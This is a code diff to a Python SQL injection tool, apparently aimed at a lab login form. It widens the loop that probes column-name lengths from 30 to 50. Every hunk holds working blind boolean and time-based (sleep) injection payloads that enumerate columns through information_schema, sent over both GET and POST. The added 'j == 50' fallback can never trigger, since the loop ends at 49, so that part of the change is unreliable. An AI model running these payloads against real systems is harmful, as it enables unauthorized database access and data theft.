@@ -93,12 +93,15 @@ class SqliColumns(SqliTables):
                         for i in range(0, int(columns_number)):
                             # 然后注 columns_number 的 length
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
+                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                 payload = "user=user1' %26%26 (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
                                     i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
                                 if self.Data.GetBuildData(payload, self.len) == 0:
                                     column_name_len = j
                                     break
+                                elif j == 50:
+                                    logger.error("Column length > 50...")
+                                    column_name_len = 50
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
@@ -143,13 +146,16 @@ class SqliColumns(SqliTables):
                         for i in range(0, int(columns_number)):
                             # 然后注 columns_number 的 length
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
+                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                 payload = "user=ddog' union SELECT 1,if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
                                     i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
 
                                 if self.Data.GetTimeData(payload, self.time) == 0:
                                     column_name_len = j
                                     break
+                                elif j == 50:
+                                    logger.error("Column length > 50...")
+                                    column_name_len = 50
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
@@ -239,13 +245,16 @@ class SqliColumns(SqliTables):
                         for i in range(0, int(columns_number)):
                             # 然后注 columns_number 的 length
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
+                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                 payload = {
                                     "user": "user1' && (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                                         i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
                                 if self.Data.PostBuildData(payload, self.len) == 0:
                                     column_name_len = j
                                     break
+                                elif j == 50:
+                                    logger.error("Column length > 50...")
+                                    column_name_len = 50
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
@@ -291,7 +300,7 @@ class SqliColumns(SqliTables):
                         for i in range(0, int(columns_number)):
                             # 然后注 columns_number 的 length
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
+                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                 payload = {
                                     "user": "admi' union SELECT 1,if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                                         i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
@@ -299,6 +308,9 @@ class SqliColumns(SqliTables):
                                 if self.Data.PostTimeData(payload, self.time) == 0:
                                     column_name_len = j
                                     break
+                                elif j == 50:
+                                    logger.error("Column length > 50...")
+                                    column_name_len = 50
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
@@ -340,3 +352,5 @@ class SqliColumns(SqliTables):
 
                 logger.info("Table %s has columns %s", table_name, columns_name)
             logger.info("Database %s has tables %s", database_name, tables_name)
+
+        print "[*]Columns list:", self.columns_name
